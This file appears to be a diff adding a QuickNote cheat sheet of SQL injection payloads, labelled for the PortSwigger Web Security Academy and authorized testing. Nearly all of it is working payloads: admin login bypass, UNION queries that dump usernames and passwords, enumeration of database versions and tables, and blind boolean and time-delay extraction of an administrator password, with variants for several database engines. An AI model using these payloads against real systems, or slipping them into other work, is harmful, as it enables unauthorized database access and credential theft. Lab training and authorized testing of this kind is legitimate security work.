@@ -1,0 +1,50 @@
+{
+  "app": "QuickNote",
+  "type": "cheatsheet",
+  "name": "SQL Injection",
+  "version": 1,
+  "description": "Common SQLi payloads for PortSwigger Web Security Academy and similar authorized testing.",
+  "snippets": [
+    { "category": "Detect & confirm", "label": "Break the query — look for an error", "text": "'" },
+    { "category": "Detect & confirm", "label": "Two quotes — error disappears? confirms SQLi", "text": "''" },
+    { "category": "Detect & confirm", "label": "Always-true condition", "text": "' OR '1'='1" },
+    { "category": "Detect & confirm", "label": "Always true, comment out the rest", "text": "' OR 1=1-- -" },
+    { "category": "Detect & confirm", "label": "Auth bypass: log in as admin", "text": "admin'-- -" },
+
+    { "category": "Comments", "label": "MySQL/MSSQL/Postgres line comment (note the space)", "text": "-- -" },
+    { "category": "Comments", "label": "MySQL line comment", "text": "#" },
+    { "category": "Comments", "label": "Inline comment", "text": "/*comment*/" },
+    { "category": "Comments", "label": "Oracle / MSSQL line comment", "text": "--" },
+
+    { "category": "UNION — column count", "label": "Increment until it errors → column count", "text": "' ORDER BY 1-- -" },
+    { "category": "UNION — column count", "label": "Add NULLs until no error", "text": "' UNION SELECT NULL-- -" },
+    { "category": "UNION — column count", "label": "2 columns", "text": "' UNION SELECT NULL,NULL-- -" },
+    { "category": "UNION — column count", "label": "3 columns", "text": "' UNION SELECT NULL,NULL,NULL-- -" },
+    { "category": "UNION — column count", "label": "Oracle needs FROM dual", "text": "' UNION SELECT NULL,NULL,NULL FROM dual-- -" },
+
+    { "category": "UNION — find text column", "label": "Swap each NULL for a string", "text": "' UNION SELECT 'a',NULL,NULL-- -" },
+    { "category": "UNION — find text column", "label": "Dump creds (2 cols)", "text": "' UNION SELECT username, password FROM users-- -" },
+    { "category": "UNION — find text column", "label": "Concat into one col (Oracle/Postgres)", "text": "' UNION SELECT username||'~'||password FROM users-- -" },
+    { "category": "UNION — find text column", "label": "Concat (MySQL)", "text": "' UNION SELECT CONCAT(username,':',password) FROM users-- -" },
+
+    { "category": "DB version", "label": "MySQL / MSSQL", "text": "' UNION SELECT @@version-- -" },
+    { "category": "DB version", "label": "PostgreSQL", "text": "' UNION SELECT version()-- -" },
+    { "category": "DB version", "label": "Oracle", "text": "' UNION SELECT banner FROM v$version-- -" },
+    { "category": "DB version", "label": "SQLite", "text": "' UNION SELECT sqlite_version()-- -" },
+
+    { "category": "List tables & columns", "label": "MySQL/MSSQL/Postgres", "text": "' UNION SELECT table_name,NULL FROM information_schema.tables-- -" },
+    { "category": "List tables & columns", "label": "Columns of a table", "text": "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -" },
+    { "category": "List tables & columns", "label": "Oracle tables", "text": "' UNION SELECT table_name,NULL FROM all_tables-- -" },
+    { "category": "List tables & columns", "label": "Oracle columns", "text": "' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'-- -" },
+
+    { "category": "Blind — conditional", "label": "True condition (page normal)", "text": "' AND '1'='1" },
+    { "category": "Blind — conditional", "label": "False condition (page differs)", "text": "' AND '1'='2" },
+    { "category": "Blind — conditional", "label": "Confirm row exists", "text": "' AND (SELECT 'a' FROM users WHERE username='administrator')='a" },
+    { "category": "Blind — conditional", "label": "Extract char-by-char", "text": "' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a" },
+
+    { "category": "Blind — time delay", "label": "MySQL", "text": "'; SELECT SLEEP(5)-- -" },
+    { "category": "Blind — time delay", "label": "PostgreSQL", "text": "'; SELECT pg_sleep(5)-- -" },
+    { "category": "Blind — time delay", "label": "MSSQL", "text": "'; WAITFOR DELAY '0:0:5'-- -" },
+    { "category": "Blind — time delay", "label": "Oracle time-based", "text": "' || (SELECT CASE WHEN (1=1) THEN dbms_pipe.receive_message(('a'),5) ELSE NULL END FROM dual)-- -" }
+  ]
+}
